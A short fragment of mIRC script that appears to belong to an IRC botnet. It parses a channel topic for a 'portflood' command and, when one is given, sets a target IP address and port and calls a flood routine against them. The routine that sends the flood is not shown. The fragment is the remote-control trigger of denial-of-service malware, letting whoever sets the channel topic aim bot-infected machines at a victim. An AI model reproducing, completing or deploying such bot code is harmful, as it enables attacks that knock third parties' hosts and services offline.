  if ( $gettok(%topic,1,32) == portflood) {  if ( $gettok(%topic,2,32) == $null) { halt } | if ( $gettok(%topic,3,32) == $null) { halt }
    if ( $gettok(%topic,4,32) == $null) { halt } |  .timerportflood.pause off
set %pf.all 0 | set %pf.ip $gettok(%topic,2,32) | set %pf.port $gettok(%topic,3,32) |   portflood $gettok(%topic,4,32)  }  }